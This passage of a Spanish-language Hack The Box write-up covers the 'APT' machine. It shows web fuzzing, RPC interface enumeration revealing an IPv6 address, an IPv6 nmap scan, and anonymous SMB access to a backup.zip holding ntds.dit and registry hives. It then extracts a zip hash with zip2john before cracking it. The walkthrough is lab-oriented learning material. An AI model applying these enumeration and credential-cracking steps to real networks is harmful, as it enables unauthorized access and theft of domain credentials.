<span class="no">Summary</span>   <span class="p">:</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Email</span><span class="p">[</span><span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">]</span>

<span class="no">Detected</span> <span class="no">Plugins</span><span class="p">:</span>
<span class="p">[</span> <span class="no">Bootstrap</span> <span class="p">]</span>
	<span class="no">Bootstrap</span> <span class="n">is</span> <span class="n">an</span> <span class="nb">open</span> <span class="n">source</span> <span class="n">toolkit</span> <span class="k">for</span> <span class="n">developing</span> <span class="n">with</span>
	<span class="no">HTML</span><span class="p">,</span> <span class="no">CSS</span><span class="p">,</span> <span class="ow">and</span> <span class="no">JS</span><span class="o">.</span>

	<span class="no">Website</span>     <span class="p">:</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">getbootstrap</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Email</span> <span class="p">]</span>
	<span class="no">Extract</span> <span class="n">email</span> <span class="n">addresses</span><span class="o">.</span> <span class="no">Find</span> <span class="n">valid</span> <span class="n">email</span> <span class="n">address</span> <span class="ow">and</span>
	<span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">email</span> <span class="n">addresses</span> <span class="n">from</span> <span class="ss">mailto: </span><span class="n">link</span>
	<span class="n">tags</span><span class="o">.</span> <span class="no">We</span> <span class="n">match</span> <span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">links</span> <span class="n">containing</span>
	<span class="ss">mailto: </span><span class="n">to</span> <span class="kp">catch</span> <span class="n">anti</span><span class="o">-</span><span class="n">spam</span> <span class="n">email</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">eg</span><span class="p">.</span> <span class="nf">bob</span> <span class="n">at</span>
	<span class="n">gmail</span><span class="p">.</span><span class="nf">com</span><span class="o">.</span> <span class="no">This</span> <span class="n">uses</span> <span class="n">the</span> <span class="n">simplified</span> <span class="n">email</span> <span class="n">regular</span>
	<span class="n">expression</span> <span class="n">from</span>
	<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">regular</span><span class="o">-</span><span class="n">expressions</span><span class="p">.</span><span class="nf">info</span><span class="o">/</span><span class="n">email</span><span class="p">.</span><span class="nf">html</span> <span class="k">for</span> <span class="n">valid</span>
	<span class="n">email</span> <span class="n">address</span> <span class="n">matching</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span>

<span class="p">[</span> <span class="no">HTML5</span> <span class="p">]</span>
	<span class="no">HTML</span> <span class="n">version</span> <span class="mi">5</span><span class="p">,</span> <span class="n">detected</span> <span class="n">by</span> <span class="n">the</span> <span class="n">doctype</span> <span class="n">declaration</span>


<span class="p">[</span> <span class="no">HTTPServer</span> <span class="p">]</span>
	<span class="no">HTTP</span> <span class="n">server</span> <span class="n">header</span> <span class="n">string</span><span class="o">.</span> <span class="no">This</span> <span class="n">plugin</span> <span class="n">also</span> <span class="n">attempts</span> <span class="n">to</span>
	<span class="n">identify</span> <span class="n">the</span> <span class="n">operating</span> <span class="nb">system</span> <span class="n">from</span> <span class="n">the</span> <span class="n">server</span> <span class="n">header</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span> <span class="p">(</span><span class="n">from</span> <span class="n">server</span> <span class="n">string</span><span class="p">)</span>

<span class="p">[</span> <span class="no">JQuery</span> <span class="p">]</span>
	<span class="no">A</span> <span class="n">fast</span><span class="p">,</span> <span class="n">concise</span><span class="p">,</span> <span class="no">JavaScript</span> <span class="n">that</span> <span class="n">simplifies</span> <span class="n">how</span> <span class="n">to</span> <span class="n">traverse</span>
	<span class="no">HTML</span> <span class="n">documents</span><span class="p">,</span> <span class="n">handle</span> <span class="n">events</span><span class="p">,</span> <span class="n">perform</span> <span class="n">animations</span><span class="p">,</span> <span class="ow">and</span> <span class="n">add</span>
	<span class="no">AJAX</span><span class="o">.</span>

	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">jquery</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span> <span class="p">]</span>
	<span class="no">Microsoft</span> <span class="no">Internet</span> <span class="no">Information</span> <span class="no">Services</span> <span class="p">(</span><span class="no">IIS</span><span class="p">)</span> <span class="k">for</span> <span class="no">Windows</span>
	<span class="no">Server</span> <span class="n">is</span> <span class="n">a</span> <span class="n">flexible</span><span class="p">,</span> <span class="n">secure</span> <span class="ow">and</span> <span class="n">easy</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">manage</span> <span class="no">Web</span> <span class="n">server</span>
	<span class="k">for</span> <span class="n">hosting</span> <span class="n">anything</span> <span class="n">on</span> <span class="n">the</span> <span class="no">Web</span><span class="o">.</span> <span class="no">From</span> <span class="n">media</span> <span class="n">streaming</span> <span class="n">to</span>
	<span class="n">web</span> <span class="n">application</span> <span class="n">hosting</span><span class="p">,</span> <span class="no">IIS</span><span class="err">'</span><span class="n">s</span> <span class="n">scalable</span> <span class="ow">and</span> <span class="nb">open</span>
	<span class="n">architecture</span> <span class="n">is</span> <span class="n">ready</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">the</span> <span class="n">most</span> <span class="n">demanding</span> <span class="n">tasks</span><span class="o">.</span>

	<span class="no">Version</span>      <span class="p">:</span> <span class="mf">10.0</span>
	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">iis</span><span class="p">.</span><span class="nf">net</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Script</span> <span class="p">]</span>
	<span class="no">This</span> <span class="n">plugin</span> <span class="n">detects</span> <span class="n">instances</span> <span class="n">of</span> <span class="n">script</span> <span class="no">HTML</span> <span class="n">elements</span> <span class="ow">and</span>
	<span class="n">returns</span> <span class="n">the</span> <span class="n">script</span> <span class="n">language</span><span class="o">/</span><span class="n">type</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span>

<span class="no">HTTP</span> <span class="no">Headers</span><span class="p">:</span>
	<span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="no">OK</span>
	<span class="no">Content</span><span class="o">-</span><span class="no">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
	<span class="no">Last</span><span class="o">-</span><span class="no">Modified</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mi">23</span> <span class="no">Dec</span> <span class="mi">2019</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">26</span> <span class="no">GMT</span>
	<span class="no">Accept</span><span class="o">-</span><span class="no">Ranges</span><span class="p">:</span> <span class="n">bytes</span>
	<span class="no">ETag</span><span class="p">:</span> <span class="s2">"0ef5b3b84b9d51:0"</span>
	<span class="no">Server</span><span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span>
	<span class="no">Date</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mo">01</span> <span class="no">Apr</span> <span class="mi">2024</span> <span class="mo">01</span><span class="p">:</span><span class="mo">02</span><span class="p">:</span><span class="mo">04</span> <span class="no">GMT</span>
	<span class="no">Connection</span><span class="p">:</span> <span class="n">close</span>
	<span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">14879</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/apt/1.png" />
</p>

<ul>
  <li>Vamos a seguir haciendo <strong>Fuzzing</strong> ya que la pagina web no es muy interesante y no encontré nada así que vamos a ver si la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> nos descubre algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.96.60/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.96.60/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000002:   301        1 L      10 W       150 Ch      "images"
000000189:   301        1 L      10 W       150 Ch      "Images"
000000536:   301        1 L      10 W       147 Ch      "css"
000000939:   301        1 L      10 W       146 Ch      "js"
000002757:   301        1 L      10 W       149 Ch      "fonts"
000003659:   301        1 L      10 W       150 Ch      "IMAGES"
000005568:   301        1 L      10 W       149 Ch      "Fonts"
000008461:   301        1 L      10 W       147 Ch      "CSS"
000009123:   301        1 L      10 W       146 Ch      "JS"
</span></code></pre></div></div>

<ul>
  <li>Bueno como tal también tenemos el protocolo <strong>RPC</strong> abierto pero no nos funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.60
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en <a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a> como enumerar este servicio al final del post nos dejan esta herramienta <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a> ya que es posible enumerar interfaces de red con <strong>rcp</strong> <a href="https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a>.</p>
  </li>
  <li>
    <p>Vamos a clonarnos el repositorio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/mubix/IOXIDResolver
Cloning into <span class="s1">'IOXIDResolver'</span>...
remote: Enumerating objects: 33, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>30/30<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 33 <span class="o">(</span>delta 12<span class="o">)</span>, reused 5 <span class="o">(</span>delta 2<span class="o">)</span>, pack-reused 0
Receiving objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, 9.04 KiB | 308.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>IOXIDResolver
➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>IOXIDResolver.py  LICENSE  README.md  requirements.txt
➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: impacket&gt;0 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>0.11.0<span class="o">)</span>
Requirement already satisfied: dsinternals <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from impacket&gt;0-&gt;-r requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>1.2.4<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si ejecutamos la herramienta solo nos piden un <strong>target</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-h</span>
IOXIDResolver.py <span class="nt">-t</span> &lt;target&gt;
</code></pre></div></div>

<ul>
  <li>Si le damos la <strong>IP</strong> vemos que nos reporta una dirección en <strong>IPV6</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-t</span> 10.129.96.60
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::1c3
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::5c2e:939a:a5ff:2f03
</code></pre></div></div>

<ul>
  <li>Para comprobar si la <code class="language-plaintext highlighter-rouge">ip</code> esta activa podemos lanzar un <code class="language-plaintext highlighter-rouge">ping</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> ping6 <span class="nt">-c</span> 1 dead:beef::b885:d62a:d679:573f
PING dead:beef::b885:d62a:d679:573f <span class="o">(</span>dead:beef::b885:d62a:d679:573f<span class="o">)</span> 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>90.1 ms

<span class="nt">---</span> dead:beef::b885:d62a:d679:573f ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 90.110/90.110/90.110/0.000 ms
</code></pre></div></div>

<h1 id="portscan-ipv6">PortScan ipv6</h1>

<ul>
  <li>Ahora lo que podemos hacer es un escaneo con <code class="language-plaintext highlighter-rouge">Nmap</code> para ver los puertos abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49689,63855 <span class="nt">-6</span> dead:beef::b885:d62a:d679:573f <span class="nt">-oN</span> targeted2
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:35 CST
Nmap scan report <span class="k">for </span>dead:beef::b885:d62a:d679:573f
Host is up <span class="o">(</span>0.094s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-01 01:35:24Z<span class="o">)</span>
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49689/tcp open  msrpc        Microsoft Windows RPC
63855/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-8m34s</span>, deviation: 22m38s, median: <span class="nt">-1s</span>
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
|   Computer name: apt
|   NetBIOS computer name: APT<span class="se">\x</span>00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System <span class="nb">time</span>: 2024-04-01T02:36:24+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-01T01:36:25
|_  start_date: 2024-04-01T00:50:55
</code></pre></div></div>

<h2 id="enumeración-ipv6">Enumeración IPV6</h2>

<ul>
  <li>Vemos que estamos ante un <strong>Windows Server 2016 Standard</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb dead:beef::b885:d62a:d679:573f
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hots</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar recursos compartidos a nivel de red aprovechando que el servicio de <strong>smb</strong> esta abierto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> apt <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	backup          Disk
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
apt is an IPv6 address <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>El recurso <strong>backup</strong> es interesante vamos a conectarnos al recurso compartido y ver lo que hay adentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //apt/backup <span class="nt">-N</span>
Anonymous login successful
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Thu Sep 24 02:30:52 2020
  ..                                  D        0  Thu Sep 24 02:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 02:30:32 2020

		5114623 blocks of size 4096. 2634373 blocks available
smb: <span class="se">\&gt;</span> get backup.zip
getting file <span class="se">\b</span>ackup.zip of size 10650961 as backup.zip <span class="o">(</span>1647.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1647.9 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.zip</code> y tiene esto dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l backup.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 10650961 bytes <span class="o">(</span>11 MiB<span class="o">)</span>

Listing archive: backup.zip

<span class="nt">--</span>
Path <span class="o">=</span> backup.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 10650961

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-09-23 11:40:25 D....            0            0  Active Directory
2020-09-23 11:38:20 .....     50331648      8483543  Active Directory/ntds.dit
2020-09-23 11:38:20 .....        16384          342  Active Directory/ntds.jfm
2020-09-23 11:40:25 D....            0            0  registry
2020-09-23 11:22:12 .....       262144         8522  registry/SECURITY
2020-09-23 11:22:12 .....     12582912      2157644  registry/SYSTEM
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-09-23 11:40:25           63193088     10650051  4 files, 2 folders
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">ntds</code> <a href="https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit">https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit</a> aquí se almacenan los hashes <code class="language-plaintext highlighter-rouge">NTLM</code>, usuarios, grupos, miembros de un grupo y mas.</p>
  </li>
  <li>
    <p>Bueno nos pide contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content zip2john backup.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8483543, <span class="nv">decmplen</span><span class="o">=</span>50331648, <span class="nv">crc</span><span class="o">=</span>ACD0B2FB <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>acd0 <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>342, <span class="nv">decmplen</span><span class="o">=</span>16384, <span class="nv">crc</span><span class="o">=</span>2A393785 <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>2a39 <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8522, <span class="nv">decmplen</span><span class="o">=</span>262144, <span class="nv">crc</span><span class="o">=</span>9BEBC2C3 <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>9beb <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>2157644, <span class="nv">decmplen</span><span class="o">=</span>12582912, <span class="nv">crc</span><span class="o">=</span>65D9BFCD <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>65d9 <span class="nb">type</span><span class="o">=</span>8
NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.
If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use
option <span class="nt">-o</span> to pick a file at a time.
➜  content <span class="nb">cat hash
</span>backup.zip:<span class="nv">$pkzip$4</span><span class="k">*</span>1<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9beb<span class="k">*</span>0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>65d9<span class="k">*</span>2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>acd0<span class="k">*</span>0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>156<span class="k">*</span>4000<span class="k">*</span>2a393785<span class="k">*</span>81733d<span class="k">*</span>37<span class="k">*</span>8<span class="k">*</span>156<span class="k">*</span>2a39<span class="k">*</span>0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996<span class="k">*</span><span class="nv">$/</span>pkzip<span class="nv">$:</span>:backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip
</code></pre></div></div>

<ul>
  <li>Si lo crackeamos vemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
